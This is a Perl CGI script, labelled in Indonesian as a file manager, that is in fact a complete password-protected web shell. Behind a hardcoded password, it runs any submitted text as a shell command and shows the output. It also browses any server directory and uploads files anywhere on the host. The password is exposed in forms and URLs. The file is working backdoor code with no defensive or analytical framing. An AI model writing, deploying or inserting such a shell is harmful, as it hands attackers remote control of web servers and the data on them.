#!c:/xampp/perl/bin/perl.exe
use strict;
use warnings;
use CGI;
use File::Basename;
use File::Spec;

my $q = CGI->new;
print "Content-type: text/html\n\n";

# ================= LOGIN CEK ===================
my $password = "dik123";
my $input_pass = $q->param("password") || "";
my $is_logged_in = ($input_pass eq $password);

# Kalau belum login, tampilkan form login
if (!$is_logged_in) {
    print <<'HTML';
<html>
<head>
  <title>Login - Perl CGI File Manager</title>
  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background:#1e1e2f;
      color:#eee;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
    }
    .login-box {
      background:#2c2c3c;
      padding:30px;
      border-radius:10px;
      box-shadow:0 0 10px #000;
      width:300px;
      text-align:center;
    }
    h1 { color:#ffcc00; margin-bottom:20px; }
    input[type=password] {
      width:90%; padding:10px; margin:10px 0;
      border-radius:5px; border:1px solid #666;
    }
    input[type=submit] {
      padding:10px 20px; background:#ffcc00;
      border:none; border-radius:5px;
      cursor:pointer; font-weight:bold;
    }
    input[type=submit]:hover { background:#ffaa00; }
  </style>
</head>
<body>
  <div class="login-box">
    <h1> Login</h1>
    <form method="post">
      <input type="password" name="password" placeholder="Masukkan Password"><br>
      <input type="submit" value="Masuk">
    </form>
  </div>
</body>
</html>
HTML
    exit;
}

# ================== JIKA LOGIN SUKSES ==================
print <<'HTML';
<html>
<head>
  <title>Perl CGI File Manager ALT5</title>
  <style>
    body { 
      font-family: "Segoe UI", Arial, sans-serif; 
      margin:20px; 
      background:#1e1e2f; 
      color:#eee;
    }
    h1 { color:#ffcc00; }
    textarea { width:100%; height:200px; background:#111; color:#0f0; padding:10px; border-radius:5px; }
    input[type=text], input[type=file] { width:70%; padding:8px; border-radius:5px; border:1px solid #666; }
    input[type=submit] { padding:8px 15px; background:#ffcc00; border:none; border-radius:5px; cursor:pointer; font-weight:bold; }
    input[type=submit]:hover { background:#ffaa00; }
    .box { background:#2c2c3c; padding:20px; border-radius:10px; box-shadow:0 0 10px #000; margin-bottom:20px; }
    table { border-collapse: collapse; width:100%; margin-top:10px; }
    th, td { padding:8px; border-bottom:1px solid #444; text-align:left; }
    th { background:#333; color:#ffcc00; }
    tr:hover { background:#444; }
    a { text-decoration:none; color:#4db8ff; font-weight:bold; }
    a:hover { color:#1ecfff; }
    .folder { color:#ffcc00; font-weight:bold; }
    .file { color:#90ee90; }
  </style>
</head>
<body>
HTML

# ============== CMD RUNNER ==================
print '<div class="box">';
print '<h1>Perl CGI Command ALT5</h1>';
print '<form method="post">';
print '<input type="hidden" name="password" value="'.$password.'">';
print '<input type="text" name="cmd" placeholder="put your command here">';
print '<input type="submit" value="run">';
print '</form>';

my $cmd = $q->param("cmd");
if ($cmd) {
    print "<h3>Hasil perintah: <code style='color:#ff8080'>$cmd</code></h3>\n";
    print "<textarea readonly>";
    my $output = `$cmd 2>&1`;
    print $output;
    print "</textarea>";
}
print "</div>";

# ============== FILE MANAGER ==================
print '<div class="box">';
print "<h1> File Manager</h1>";

# Direktori sekarang
my $dir = $q->param("dir") || ".";
$dir = File::Spec->rel2abs($dir);

# Tombol ke parent folder
my $parent = dirname($dir);
print "<p><b>Browsing:</b> <span style='color:#4db8ff'>$dir</span></p>";
print "<p><a href='", $q->url(-relative=>1), "?password=$password&dir=$parent'> Ke atas</a></p>";

# Upload form
print "<form method='post' enctype='multipart/form-data'>";
print "<input type='hidden' name='dir' value='$dir'>";
print "<input type='hidden' name='password' value='$password'>";
print "<input type='file' name='uploadfile'> ";
print "<input type='submit' value='Upload'>";
print "</form>";

# Proses upload
if (my $fh = $q->upload("uploadfile")) {
    my $filename = basename($q->param("uploadfile"));
    my $target = "$dir/$filename";
    open(my $out, ">", $target) or print "<p style='color:red'> Gagal upload ke $target: $!</p>";
    binmode $out;
    while (my $bytes = <$fh>) {
        print $out $bytes;
    }
    close $out;
    print "<p style='color:lightgreen'> Upload sukses: $filename</p>";
}

# List isi direktori
print "<table>";
print "<tr><th>Nama</th><th>Tipe</th><th>Ukuran</th></tr>";

opendir(my $dh, $dir) or die "Tidak bisa buka direktori $dir: $!";
while (my $file = readdir($dh)) {
    next if $file eq ".";
    my $path = "$dir/$file";
    my $type = (-d $path) ? " Folder" : " File";
    my $size = (-f $path) ? -s $path : "-";

    if (-d $path) {
        my $link = $q->url(-relative=>1) . "?password=$password&dir=$path";
        print "<tr><td class='folder'><a href='$link'>$file</a></td><td>$type</td><td>$size</td></tr>";
    } else {
        print "<tr><td class='file'>$file</td><td>$type</td><td>$size</td></tr>";
    }
}
closedir($dh);

print "</table>";
print "</div>";

print "</body></html>";
